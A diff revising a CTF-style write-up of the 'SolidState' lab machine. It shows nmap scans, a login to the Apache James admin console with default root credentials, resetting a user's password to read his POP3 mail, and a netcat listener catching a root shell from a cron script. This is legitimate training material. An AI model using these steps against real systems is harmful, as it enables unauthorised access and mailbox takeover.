@@ -51,7 +51,7 @@ sudo nmap -Pn 10.129.102.95 -oA nmap/SolidState_initial
 <h3 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> Nmap: Detailed Scan <span style="color:#ff7b00"></span></h3>
 <br></br>
 
-**Since there are only six open ports, I will run the same command again, this time adding `-sC -sV` to get default script output and service version information.** 
+**Since there are only six open ports, we don't need to change much in the command, run the same command again this time adding `-sC -sV` to get default script output and service version information.** 
 
 ```
 nmap -Pn -sV -sC 10.129.102.95 -v -oA nmap/SolidState_detailed
@@ -61,7 +61,7 @@ nmap -Pn -sV -sC 10.129.102.95 -v -oA nmap/SolidState_detailed
 - **Domain: *solid-state-security.com* (We can add this to /etc/hosts now.)**
 
 > [!NOTE]- Add a Host to /etc/hosts
-> ```echo "10.129.229.56 authority.htb" | sudo tee -a /etc/hosts```
+> ```echo "10.129.102.95 solid-state-security.com" | sudo tee -a /etc/hosts```
 
 <br></br>
 
@@ -69,7 +69,7 @@ nmap -Pn -sV -sC 10.129.102.95 -v -oA nmap/SolidState_detailed
 
 > [!NOTE] Thoughts on Nmap Scan
 > What stands out to me besides the website on port 80 are the following ports: 25, 110, 4555.
-> [SMTP(25)](https://www.mailgun.com/blog/email/which-smtp-port-understanding-ports-25-465-587/) is a process by which emails are sent across the internet. [POP3(110))](https://kewl.lu/articles/pop3/) is used to retrieve/download emails from a users mailbox. [James Remote Admin(4555)]([https://www.mailgun.com/blog/email/which-smtp-port-understanding-ports-25-465-587/](https://www.ibm.com/docs/en/webmethods-integration/wm-infrastructure/10.15.0?topic=transport-setting-up-apache-james-server))  interface for managing users, passwords, aliases, and redirects. 
+> [SMTP(25)](https://www.mailgun.com/blog/email/which-smtp-port-understanding-ports-25-465-587/) is a process by which emails are sent across the internet. [POP3(110))](https://kewl.lu/articles/pop3/) is used to retrieve/download emails from a users mailbox. [James Remote Admin(4555)](https://www.ibm.com/docs/en/webmethods-integration/wm-infrastructure/10.15.0?topic=transport-setting-up-apache-james-server)  interface for managing users, passwords, aliases, and redirects. 
 
 ---
 
@@ -81,14 +81,14 @@ nmap -Pn -sV -sC 10.129.102.95 -v -oA nmap/SolidState_detailed
 **A possible attack path look like this: We use James default credentials to login as root and change passwords of users and than read there emails to find information disclosure or other helpful information.** 
 
 ```
-telnet 10.129.102.24 4555
+telnet 10.129.102.95 4555
 ```
 
 **With `telnet` we can connect to port `4555` and login as root.**
 
 ```
-Trying 10.129.102.24...
-Connected to 10.129.102.24.
+Trying 110.129.102.95...
+Connected to 10.129.102.95.
 Escape character is '^]'.
 JAMES Remote Administration Tool 2.3.2
 Please enter your login and password
@@ -99,7 +99,7 @@ root
 Welcome root. HELP for a list of commands
 ```
 
-**The list of command we se after typing `HELP` explains `setpassword [username] [password]` can be used to change a users password.** 
+**The list of commands we see after typing `HELP` in the terminal explains thath "`setpassword [username] [password]`" can be used to change a  password.** 
 
 ```
 setpassword john password123
@@ -113,9 +113,10 @@ Password for john reset
 **This credentials can be used to login via telnet port 110.**
 
 ```
-telnet 10.129.102.24 110
+telnet 10.129.102.95 110
 ```
 
+**I mentioned the POP3 documentation in the "thoughts" part of the writeup it explains how to login with the username and password and retrieve emails from John's mailbox.**
 ```
 +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
 
@@ -231,7 +232,8 @@ nc -lvnp 9001
 
 **We got a connection as root and can be sure that `tmp.py` is run every few minutes.**
 
-**As a little bonus lets try to figure out what going on with the crontab we were not able to inspect as Mindy. Looking at the `crontabs` directory again the sticky bit (`T`) restricts deletion and renaming of files within the directory to the file's owner, the directory's owner, or root, regardless of write permissions on the directory.** 
+**Only `root` (`rwx`) and members of the `crontab` group (`-wx`, write and enter, but not list) have access. Everyone else, including Mindy, has no permissions at all (`--T`), so she can't even enter the directory. The `T` at the end is the sticky bit (without execute permission for others). It only prevents users from deleting or renaming files they don't own.
+
 ```
 /var/spool/cron$ ls -ld crontabs
 drwx-wx--T 2 root crontab 4096 Apr 26  2021 crontabs
